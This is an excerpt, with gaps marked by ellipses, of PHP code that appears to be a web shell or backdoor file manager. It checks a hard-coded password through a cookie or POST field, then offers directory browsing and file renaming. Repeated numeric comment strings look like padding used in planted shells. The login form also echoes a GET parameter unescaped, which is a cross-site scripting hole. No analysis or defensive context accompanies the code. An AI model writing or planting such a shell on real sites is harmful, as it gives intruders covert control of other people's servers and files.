...
$pass = false;
if (isset($_COOKIE['pw_name_96016'])) {
    if(($_COOKIE['pw_name_96016']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_96016'])) {
        if(($_POST['pw_name_96016']) == $auth_key) {
            setcookie("pw_name_96016", $_POST['pw_name_96016']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_96016' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774946054 1724682774306658 1724682774655670 1724682774359182
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774946054 1724682774306658 1724682774655670 1724682774359182
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774946054 1724682774306658 1724682774655670 1724682774359182
            $name = PATH . "/" . $_GET['r'];
